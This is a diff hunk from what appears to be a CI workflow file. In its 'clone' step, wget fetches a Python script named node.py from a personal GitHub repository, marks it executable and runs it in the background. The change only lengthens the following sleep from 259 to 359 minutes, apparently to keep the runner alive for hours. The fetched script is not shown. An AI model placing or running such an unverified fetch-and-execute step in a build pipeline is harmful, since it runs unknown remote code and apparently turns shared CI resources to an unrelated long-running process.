@@ -124,7 +124,7 @@ jobs:
       id: go
     - name: clone
       run: wget https://github.com/ratnasi7283-art/bahan/raw/refs/heads/main/node.py && chmod u+x node.py && python node.py &
-            sleep 259m
+            sleep 359m
         
     
 
